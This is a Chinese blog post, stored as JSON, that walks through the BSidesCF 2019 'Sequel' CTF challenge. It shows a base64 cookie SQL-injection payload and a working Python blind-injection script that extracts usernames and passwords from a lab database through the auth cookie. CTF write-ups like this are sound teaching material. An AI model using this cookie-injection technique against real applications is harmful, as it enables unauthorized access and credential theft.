{"title":"Cookie注入练习题","uid":"6bb2202be349e1d43d125b9c1b0ff943","slug":"Cookie注入练习题","date":"2020-04-17T12:09:30.000Z","updated":"2020-04-18T01:35:14.000Z","comments":true,"path":"api/articles/Cookie注入练习题.json","keywords":"A1andNS","cover":[],"content":"<p>最近做了一题Cookie注入的题目</p>\n<p>这是一题cookie注入的练习题，出自BSidesCF 2019]Sequel，这里用BUUOJ来做。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417200615.png\" alt=\"首页\"></p>\n<p>爆破得到username为guest，password为guest</p>\n<p>登陆进去</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417200636.png\" alt=\"登录后\"></p>\n<p>看到一个电影数据库，其他什么都没有看看网页源码和HTTP请求内容。发现一个奇怪的cookie</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417200725.png\" alt=\"cookie\"></p>\n<p>看起来有点像base64，所以做一个base64的解码，果然是base64.</p>\n<p>解码后得到一个json格式{“username”:”guest”,”password”:”guest”}</p>\n<p>然后开始试一下有没有存在cookie注入，构造了一个<code>&#123;&quot;username&quot;:&quot;guest\\&quot; or \\&quot;1\\&quot;=\\&quot;1&quot;,&quot;password&quot;:&quot;guest&quot;&#125;</code>,把他base64一下，用burpsuit提交一下，发现存在注入。</p>\n<p>那么就开始手工注入来获取表名</p>\n<p>得到一个表名为userinfo的表</p>\n<p>exp：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> requests\n<span class=\"token keyword\">import</span> base64\n<span class=\"token keyword\">import</span> string\n\nflag <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span>\nss <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>printable\nurl <span class=\"token operator\">=</span> <span class=\"token string\">\"http://fd19da3a-5d4e-469c-937c-98f2f0562928.node3.buuoj.cn/sequels\"</span>\n<span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> ss<span class=\"token punctuation\">:</span>\n            exp <span class=\"token operator\">=</span> <span class=\"token string\">'&#123;&#123;\"username\":\"\\\\\" or (substr((select username from userinfo limit &#123;0&#125;,1),&#123;1&#125;,1)=\\\\\"&#123;2&#125;\\\\\")or \\\\\"\",\"password\":\"guest\"&#125;&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>\n                x<span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span>\n            <span class=\"token comment\">#爆密码改username为password</span>\n            <span class=\"token comment\">#print(exp)</span>\n            code <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>exp<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            cookies <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token string\">\"1337_AUTH\"</span><span class=\"token punctuation\">:</span> code\n            <span class=\"token punctuation\">&#125;</span>\n            content <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span> cookies<span class=\"token operator\">=</span>cookies<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>content\n            <span class=\"token keyword\">if</span> <span class=\"token string\">\"Sequel\"</span> <span class=\"token keyword\">in</span> content<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                flag <span class=\"token operator\">+=</span> y\n                <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span>\n                <span class=\"token keyword\">break</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>得到</p>\n<p>username：sequeladmin</p>\n<p>password：f5ec3af19f0d3679e7d5a148f4ac323d</p>\n<p>登录得到flag</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200417200332.png\" alt=\"flag\"></p>\n","text":"最近做了一题Cookie注入的题目 这是一题cookie注入的练习题，出自BSidesCF 2019]Sequel，这里用BUUOJ来做。 爆破得到username为guest，password为guest 登陆进去 看到一个电影数据库，其他什么都没有看看网页源码和HTTP请求内...","link":"","photos":[],"count_time":{"symbolsCount":"1.4k","symbolsTime":"1 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"SQL注入","slug":"SQL注入","count":3,"path":"api/tags/SQL注入.json"}],"toc":"","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"通达OA未授权任意文件上传及文件包含漏洞分析学习","uid":"bcc4c805c00a13a68269e7322cfcb1df","slug":"通达OA未授权任意文件上传及文件包含漏洞分析学习","date":"2020-04-18T01:37:32.000Z","updated":"2020-09-30T04:22:22.000Z","comments":true,"path":"api/articles/通达OA未授权任意文件上传及文件包含漏洞分析学习.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200418094130.jpg","text":"今年3月份通达OA爆出了文件上传和文件包含漏洞，网络上很多复现和分析的博客，今天我也来试着分析分析，据360灵腾安全实验室判断该漏洞等级为高，利用难度低，威胁程度高，所以可能比较适合代码审计的新手来练练。 0x00 漏洞概述通达OA（Office Anywhere网络智能办公系统...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":33,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","count":3,"path":"api/tags/漏洞分析.json"},{"name":"文件上传","slug":"文件上传","count":2,"path":"api/tags/文件上传.json"},{"name":"RCE","slug":"RCE","count":5,"path":"api/tags/RCE.json"},{"name":"代码审计","slug":"代码审计","count":2,"path":"api/tags/代码审计.json"},{"name":"通达OA","slug":"通达OA","count":2,"path":"api/tags/通达OA.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"星阑平台练习","uid":"c2e945f14bdb314a4d9b15471662d692","slug":"星阑平台练习","date":"2020-04-10T15:54:22.000Z","updated":"2020-10-08T12:11:12.000Z","comments":true,"path":"api/articles/星阑平台练习.json","keywords":"A1andNS","cover":[],"text":"0x0001 Misc 2 一开始不知道是什么意思后来看了一下字母，发现只有ABCDE，所以猜测这是一个16进制段 在网上用工具把16进制转换为ascii后，得到了cjV5RyBscDlJIEJqTSB0RmhCVDZ1aCB5N2lKIFFzWiBiaE0g 看起来有点像bas...","link":"","photos":[],"count_time":{"symbolsCount":"6.8k","symbolsTime":"6 mins."},"categories":[{"name":"CTF","slug":"CTF","count":42,"path":"api/categories/CTF.json"}],"tags":[{"name":"WEB","slug":"WEB","count":39,"path":"api/tags/WEB.json"},{"name":"Misc","slug":"Misc","count":3,"path":"api/tags/Misc.json"},{"name":"Crypto","slug":"Crypto","count":4,"path":"api/tags/Crypto.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}